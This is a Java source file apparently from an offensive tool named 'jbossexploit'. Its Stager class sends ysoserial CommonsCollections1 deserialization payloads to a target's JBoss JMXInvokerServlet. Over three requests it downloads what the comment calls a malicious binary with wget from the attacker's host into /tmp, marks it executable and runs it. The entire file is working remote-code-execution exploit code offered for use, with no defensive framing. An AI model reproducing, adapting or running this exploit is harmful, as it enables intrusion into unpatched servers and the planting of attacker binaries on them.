package jbossexploit;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpEntityEnclosingRequestBase;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.net.URI;

public class Stager {

    public static void sendPayload(int stage, String rhost, int rport, String lhost, int wport, String binaryName) {
        ysoserial.GeneratePayload ysoserial = new ysoserial.GeneratePayload();
        String command = null;

        // I was unable to chain commands ("&&") during testing, so we'll send 3 separate requests to download and execute
        // the malicious binary
        switch (stage) {
            case 0:
                command = "wget -O /tmp/" + binaryName + " http://" + lhost + ":" + wport + "/" + binaryName;
                break;

            case 1:
                command = "chmod +x /tmp/" + binaryName;
                break;

            case 2:
                command = "/tmp/" + binaryName;
                break;
        }

        Object payload = ysoserial.generate("CommonsCollections1", command);


        String url = "http://" + rhost + ":" + rport + "/invoker/JMXInvokerServlet";

        DefaultHttpClient httpClient = new DefaultHttpClient();

        // http://stackoverflow.com/questions/2836646/java-serializable-object-to-byte-array
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutput out = null;
        byte[] payloadBytes = null;
        try {
            out = new ObjectOutputStream(bos);
            out.writeObject(payload);
            payloadBytes = bos.toByteArray();
        } catch (Exception e) {
            System.out.println("Error converting payload to byte array.");
            System.exit(1);
        }
        HttpEntity entity = new ByteArrayEntity(payloadBytes);
        HttpGetWithEntity e = new HttpGetWithEntity();
        e.setEntity(entity);
        e.addHeader("Host", rhost + ":" + rport);
        URI uri = null;
        try {
            uri = new URI(url);
        } catch (Exception ex) {
            System.out.println("Error parsing URL.");
            System.exit(1);
        }
        e.setURI(uri);

        try {
            HttpResponse response = httpClient.execute(e);
        } catch (Exception ex1) {
            System.out.println("Error reading response.");
            System.exit(1);
        }
    }

    public static class HttpGetWithEntity extends HttpEntityEnclosingRequestBase {
        // Allows adding content to the body of a GET request, as required by ysoserial
        // http://stackoverflow.com/questions/12535016/apache-httpclient-get-with-body

        public final static String METHOD_NAME = "GET";

        @Override
        public String getMethod() {
            return METHOD_NAME;
        }
    }
}
